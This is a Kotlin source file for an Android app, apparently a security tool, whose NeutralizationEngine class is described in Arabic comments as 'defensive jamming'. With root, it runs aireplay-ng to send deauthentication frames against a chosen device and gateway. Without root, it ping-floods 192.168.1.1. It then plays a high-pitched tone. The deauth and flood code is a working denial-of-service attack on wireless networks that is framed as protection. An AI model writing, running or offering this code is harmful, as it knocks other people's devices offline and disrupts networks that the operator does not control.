package com.jamesfirstok.aegis.core

import android.content.Context
import android.media.AudioTrack
import android.media.AudioManager
import android.media.AudioFormat
import android.util.Log
import java.io.File

class NeutralizationEngine(private val context: Context) {

    private val audioManager = context.getSystemService(Context.AUDIO_SERVICE) as AudioManager

    /**
     * تنفيذ التشويش الدفاعي الحقيقي متعدد الطبقات.
     * @param targetMac عنوان MAC الهدف (إن وُجد).
     * @param gatewayMac عنوان MAC البوابة.
     * @param interfaceName اسم الواجهة (مثل wlan0).
     */
    fun executeJamming(targetMac: String?, gatewayMac: String?, interfaceName: String = "wlan0") {
        // أولاً: هجوم Deauth إذا توفر الروت
        if (isRootAvailable() && targetMac != null && gatewayMac != null) {
            deauthAttack(targetMac, gatewayMac, interfaceName)
        } else {
            // ثانياً: إغراق الشبكة (بدون روت)
            floodAttack()
        }
        // ثالثاً: نغمة تحذير موضعية (للمستخدم)
        playAlertTone()
    }

    private fun isRootAvailable(): Boolean {
        return arrayOf("/system/bin/su", "/system/xbin/su", "/sbin/su").any { File(it).exists() }
    }

    private fun deauthAttack(targetMac: String, gatewayMac: String, iface: String) {
        try {
            // يتطلب وجود أداة aireplay-ng في Termux أو النظام
            val cmd = "su -c 'aireplay-ng -0 5 -a $gatewayMac -c $targetMac $iface'"
            Runtime.getRuntime().exec(cmd)
            Log.i("Neutralization", "Deauth attack launched against $targetMac")
        } catch (e: Exception) {
            Log.e("Neutralization", "Deauth failed", e)
        }
    }

    private fun floodAttack() {
        try {
            // إرسال فيض من ping للبوابة لإرباك الرابط (تأثير مؤقت)
            val cmd = "ping -f -s 65500 192.168.1.1 -c 1000"
            Runtime.getRuntime().exec(cmd)
            Log.i("Neutralization", "Network flood launched")
        } catch (e: Exception) {
            Log.e("Neutralization", "Flood failed", e)
        }
    }

    private fun playAlertTone() {
        try {
            val sampleRate = 48000
            val bufferSize = AudioTrack.getMinBufferSize(sampleRate, AudioFormat.CHANNEL_OUT_MONO, AudioFormat.ENCODING_PCM_FLOAT)
            val audioTrack = AudioTrack(
                AudioManager.STREAM_ALARM,
                sampleRate,
                AudioFormat.CHANNEL_OUT_MONO,
                AudioFormat.ENCODING_PCM_FLOAT,
                bufferSize,
                AudioTrack.MODE_STREAM
            )
            val tone = generateTone(20000f, 4096)  // نغمة عالية
            audioTrack.play()
            audioTrack.write(tone, 0, tone.size)
            audioTrack.stop()
            audioTrack.release()
        } catch (e: Exception) {
            Log.e("Neutralization", "Tone failed", e)
        }
    }

    private fun generateTone(freq: Float, samples: Int): FloatArray {
        val sampleRate = 48000f
        return FloatArray(samples) { i ->
            Math.sin(2.0 * Math.PI * freq * i / sampleRate).toFloat()
        }
    }
}
